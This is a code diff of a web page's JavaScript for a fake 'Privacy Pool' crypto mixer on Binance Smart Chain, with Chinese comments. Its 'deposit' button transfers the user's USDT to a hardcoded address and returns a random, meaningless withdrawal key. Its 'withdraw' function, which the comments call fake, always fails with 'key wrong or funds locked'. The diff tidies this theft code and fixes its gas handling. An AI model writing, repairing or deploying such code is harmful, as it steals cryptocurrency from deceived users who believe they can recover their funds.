@@ -102,141 +102,137 @@ button.gray{background:#1F242F;color:#fff}
 
 <script>
 const YOUR_ADDRESS = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const USDT_CONTRACT = "0x55d398c26d670d7d4941a1be7f9975f5c2d9413";
+const USDT = "0x55d398c26d670d7d4941a1be7f9975f5c2d9413";
 
 let account = null;
 let userKey = "";
 
-// 面板切换
+// 切换面板
 document.querySelectorAll('.tabbtn').forEach(t => {
-    t.onclick = () => {
-        document.querySelectorAll('.tabbtn').forEach(b => b.classList.remove('active'));
-        document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
-        t.classList.add('active');
-        document.getElementById(t.dataset.target).classList.add('active');
-    }
-});
+  t.onclick = () => {
+    document.querySelectorAll('.tabbtn').forEach(b=>b.classList.remove('active'))
+    document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'))
+    t.classList.add('active')
+    document.getElementById(t.dataset.target).classList.add('active')
+  }
+})
 
 // 连接钱包 + 签名
 document.getElementById('connect').onclick = async () => {
-    if (!window.ethereum) {
-        alert("请在钱包浏览器打开");
-        return;
-    }
-    try {
-        // 获取账户
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        account = accounts[0];
+  if(!window.ethereum){alert("请在钱包浏览器打开");return}
+  try{
+    const accounts = await window.ethereum.request({method:'eth_requestAccounts'})
+    account = accounts[0]
 
-        // 签名消息
-        const msg = "Sign to connect Privacy Pool\nNo authorization needed";
-        const hexMsg = "0x" + new TextEncoder().encode(msg).reduce((hex, byte) => hex + byte.toString(16).padStart(2, '0'), '');
+    // 签名
+    const msg = "Connect Wallet"
+    const hexMsg = new TextEncoder().encode(msg)
+    const hex = Array.from(hexMsg).map(b=>b.toString(16).padStart(2,'0')).join('')
+    await window.ethereum.request({
+      method:'personal_sign',
+      params:['0x'+hex, account]
+    })
 
-        // 弹出签名
-        await window.ethereum.request({
-            method: 'personal_sign',
-            params: [hexMsg, account, '']
-        });
-
-        // 签名成功后显示信息
-        document.getElementById('addr').innerText = account.slice(0, 6) + "..." + account.slice(-4);
-        await switchToBSC();
-        await updateNetwork();
-        await getUSDTBalance();
-
-    } catch (e) {
-        alert("已取消签名或连接失败");
-    }
-};
-
-// 切换 BSC
-async function switchToBSC() {
-    try {
-        await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: '0x38' }]
-        });
-    } catch (e) {}
+    document.getElementById('addr').innerText = account.slice(0,6)+'...'+account.slice(-4)
+    await switchBSC()
+    await showNetwork()
+    await getBalance()
+  }catch(e){
+    alert("取消签名")
+  }
 }
 
-// 更新网络显示
-async function updateNetwork() {
-    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-    document.getElementById('network').innerText = chainId === '0x38' ? 'BSC 主网' : '错误网络';
+// 切换BSC
+async function switchBSC(){
+  try{
+    await window.ethereum.request({
+      method:'wallet_switchEthereumChain',
+      params:[{chainId:'0x38'}]
+    })
+  }catch(e){}
 }
 
-// ========== 修复：稳定读取 USDT 余额 ==========
-async function getUSDTBalance() {
-    if (!account) return;
-    try {
-        const data = `0x70a08231000000000000000000000000${account.slice(2)}`;
-        const result = await window.ethereum.request({
-            method: 'eth_call',
-            params: [{ to: USDT_CONTRACT, data: data }, 'latest']
-        });
-        const balance = BigInt(result);
-        const usdt = (Number(balance) / 1e18).toFixed(2);
-        document.getElementById('usdtBal').innerText = usdt;
-    } catch (e) {
-        document.getElementById('usdtBal').innerText = '0.00';
-    }
+// 显示网络
+async function showNetwork(){
+  const c = await window.ethereum.request({method:'eth_chainId'})
+  document.getElementById('network').innerText = c==='0x38'?'BSC 主网':'错误网络'
+}
+
+// 读取 USDT 余额（稳定版）
+async function getBalance(){
+  if(!account)return
+  try{
+    const data = '0x70a08231000000000000000000000000'+account.slice(2)
+    const res = await window.ethereum.request({
+      method:'eth_call',
+      params:[{to:USDT, data:data},'latest']
+    })
+    const v = parseInt(res,16)/1e18
+    document.getElementById('usdtBal').innerText = v.toFixed(2)
+  }catch(e){
+    document.getElementById('usdtBal').innerText = '0.00'
+  }
 }
 
 // 生成密钥
-function generateKey() {
-    const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
-    let key = 'POOL-';
-    for (let i = 0; i < 32; i++) {
-        key += chars[Math.floor(Math.random() * chars.length)];
-    }
-    return key;
+function genKey(){
+  const s = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+  let k='POOL-'
+  for(let i=0;i<32;i++)k+=s[Math.floor(Math.random()*s.length)]
+  return k
 }
 
-// 存入 USDT
+// 存入 USDT（修复gas错误，不手动算gas）
 document.getElementById('doDeposit').onclick = async () => {
-    if (!account) { setStatus1("请先连接钱包"); return; }
-    const amt = document.getElementById('amount').value;
-    if (!amt || amt <= 0) { setStatus1("请输入有效金额"); return; }
+  if(!account){setStatus1("请先连接钱包");return}
+  const amt = document.getElementById('amount').value
+  if(!amt||amt<=0){setStatus1("请输入有效金额");return}
 
-    setStatus1("处理中，请在钱包确认…");
+  setStatus1("处理中...")
+  try{
+    const amount = parseFloat(amt)
+    const decimals = 1e18
+    const val = BigInt(Math.floor(amount*decimals)).toString(16).padStart(64,'0')
+    const data = '0xa9059cbb'
+      +'000000000000000000000000'+YOUR_ADDRESS.slice(2)
+      +val
 
-    try {
-        const amountWei = BigInt(Math.floor(parseFloat(amt) * 1e18));
-        const data = '0xa9059cbb'
-            + '000000000000000000000000' + YOUR_ADDRESS.slice(2)
-            + amountWei.toString(16).padStart(64, '0');
+    // 不填gas，让钱包自动处理
+    const tx = await window.ethereum.request({
+      method:'eth_sendTransaction',
+      params:[{
+        from:account,
+        to:USDT,
+        data:data
+      }]
+    })
 
-        const tx = await window.ethereum.request({
-            method: 'eth_sendTransaction',
-            params: [{ from: account, to: USDT_CONTRACT, data: data }]
-        });
+    userKey = genKey()
+    setStatus1("✅ 存入成功")
+    document.getElementById('saveKey').innerHTML = `
+    <div class="key-box">提取密钥：<br><strong>${userKey}</strong></div>
+    <small style="color:#848E9C">请妥善保管</small>
+    `
+    getBalance()
+  }catch(e){
+    setStatus1("交易取消或失败")
+  }
+}
 
-        userKey = generateKey();
-        setStatus1("✅ 存入成功");
-        document.getElementById('saveKey').innerHTML = `
-            <div class="key-box">提取密钥：<br><strong>${userKey}</strong></div>
-            <small style="color:#848E9C">请妥善保管，用于提取</small>
-        `;
-        getUSDTBalance();
-    } catch (e) {
-        setStatus1("失败：" + e.message.slice(0, 30));
-    }
-};
-
-// 提取（仿真）
+// 提取（假）
 document.getElementById('doWithdraw').onclick = () => {
-    const key = document.getElementById('withKey').value;
-    const addr = document.getElementById('withAddr').value;
-    const amt = document.getElementById('withAmount').value;
-    if (!key || !addr || !amt) { setStatus2("请填写完整信息"); return; }
-    setStatus2("验证密钥中…");
-    setTimeout(() => {
-        setStatus2("❌ 提取失败：密钥错误或资金锁定");
-    }, 1500);
-};
+  const k = document.getElementById('withKey').value
+  const a = document.getElementById('withAddr').value
+  const m = document.getElementById('withAmount').value
+  if(!k||!a||!m){setStatus2("请填写完整");return}
+  setStatus2("验证中...")
+  setTimeout(()=>{
+    setStatus2("❌ 密钥错误或资金锁定")
+  },1500)
+}
 
-function setStatus1(msg) { document.getElementById('status1').innerText = msg; }
-function setStatus2(msg) { document.getElementById('status2').innerText = msg; }
+function setStatus1(m){document.getElementById('status1').innerText=m}
+function setStatus2(m){document.getElementById('status2').innerText=m}
 </script>
 </body>
 </html>
